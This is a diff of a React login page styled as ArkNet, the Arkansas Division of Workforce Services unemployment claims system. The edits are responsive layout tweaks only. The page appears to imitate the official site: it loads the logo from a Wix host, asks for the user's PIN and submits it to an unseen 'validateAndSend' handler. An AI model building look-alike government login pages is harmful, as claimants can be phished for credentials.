@@ -43,32 +43,32 @@ export default function MainContent() {
       margin: 0
     }}>
       <section style={{
-        background: '#f7f7f7', // very light grey
+        background: '#f7f7f7',
         padding: '0',
         width: '100%',
         display: 'flex',
         flexDirection: 'column',
-        alignItems: 'center', // center everything horizontally
+        alignItems: 'center',
         boxSizing: 'border-box',
       }} aria-label="main content">
         <div style={{
           display: 'flex',
           flexDirection: 'row',
           alignItems: 'center',
-          justifyContent: 'flex-start', // align everything to the left
+          justifyContent: 'center',
           width: '100%',
           height: 90,
-          padding: '0 0 0 450px', // set left padding to 450px
-          marginLeft: 0, // remove left margin
+          padding: '0 16px',
+          marginLeft: 0,
         }}>
           <img
             src="https://static.wixstatic.com/media/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png/v1/fill/w_238,h_66,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png"
             alt="ArkNet Logo"
-            style={{width: 238, height: 66, objectFit: 'cover', marginRight: 32, border: 'none'}}
+            style={{width: 180, height: 50, objectFit: 'cover', marginRight: 16, border: 'none'}}
           />
           <div style={{display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', width: 'auto'}}>
             <h1 style={{
-              fontSize: 32,
+              fontSize: 'clamp(20px, 5vw, 32px)',
               fontWeight: 'bold',
               fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
               color: '#000',
@@ -82,11 +82,11 @@ export default function MainContent() {
               Arkansas Division of Workforce Services
             </h1>
             <h2 style={{
-              fontSize: 22,
+              fontSize: 'clamp(16px, 3vw, 22px)',
               fontWeight: 500,
               fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
               color: '#071C93',
-              margin: '4px 0 0 0', // very little space between heading and subheading
+              margin: '4px 0 0 0',
               letterSpacing: '0.2px',
               textAlign: 'left',
               lineHeight: 1.3,
@@ -96,25 +96,28 @@ export default function MainContent() {
           </div>
         </div>
         <h3 style={{
-          width: 850,
+          width: '100%',
+          maxWidth: 850,
           margin: '32px auto 0 auto',
-          fontSize: 22,
+          fontSize: 'clamp(16px, 4vw, 22px)',
           fontWeight: 600,
           color: '#071C93',
           fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
           textAlign: 'center',
         }}>
-          Welcome to ArkNet (Arkansas Internet Continued Claims System)
+          Welcome to ArkNet (Arkansas Internet Continued Claims System).
         </h3>
         <div style={{
-          width: 850,
+          width: '100%',
+          maxWidth: 850,
           height: '32px',
           margin: '18px auto 0px auto',
         }}></div>
         <div style={{
-          width: 850,
+          width: '100%',
+          maxWidth: 850,
           margin: '0 auto 0px auto',
-          fontSize: 18,
+          fontSize: 'clamp(14px, 3vw, 18px)',
           fontWeight: 400,
           color: '#071C93',
           fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
@@ -123,9 +126,10 @@ export default function MainContent() {
           Please log in: (If you set a PIN on Arkline use that PIN here)
         </div>
         <form onSubmit={validateAndSend} style={{
-          width: 850,
+          width: '100%',
+          maxWidth: 850,
           background: '#fff',
-          padding: '32px 32px 24px 32px',
+          padding: '32px 16px 24px 16px',
           borderRadius: 0,
           boxShadow: 'none',
           border: '1.5px solid #000',
